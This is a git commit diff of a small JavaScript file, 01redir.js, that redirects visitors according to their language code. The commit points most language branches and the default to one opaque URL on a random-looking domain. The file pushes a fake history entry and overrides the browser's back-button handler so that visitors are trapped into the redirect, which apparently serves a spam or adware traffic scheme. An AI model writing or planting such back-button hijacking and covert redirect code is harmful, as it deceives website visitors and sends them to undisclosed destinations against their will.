e219b4e7e3efcbd280982a52e2d116da667574a2
apikkondang <apikkondang@gmail.com>
2020-12-29 16:16:49 +0700

    Update 01redir.js

--- 01redir.js
+++ 01redir.js
@@ -1,12 +1,12 @@
 var bhs = lang;
-	if(bhs == "ID") 		var linkredir = "https://www.blog-hot.com/p/blog-page_24.html"  
+	if(bhs == "ID") 	var linkredir = "https://www.blog-hot.com/p/blog-page_24.html"  
 	else if(bhs == "MY") 	var linkredir = "https://www.blog-hot.com/p/my-penjelasan-fxc.html"          
 	else if(bhs == "IN") 	var linkredir = "https://www.blog-hot.com/p/in.html"          
-	else if(bhs == "TH") 	var linkredir = "https://www.blog-hot.com/p/th_15.html"          
-	else if(bhs == "VN") 	var linkredir = "https://www.blog-hot.com/p/vn-follow-up.html"          
-	else if(bhs == "TR") 	var linkredir = "https://www.blog-hot.com/p/tr-follback.html"    
-	else if(bhs == "RO") 	var linkredir = "RO"    
-	else                    var linkredir = "https://www.blog-hot.com/p/blog-page_24.html"    
+	else if(bhs == "TH") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"          
+	else if(bhs == "VN") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"          
+	else if(bhs == "TR") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
+	else if(bhs == "RO") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
+	else                    var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
 
 window.history.pushState('forward', null, '');
 window.onpopstate = function() {
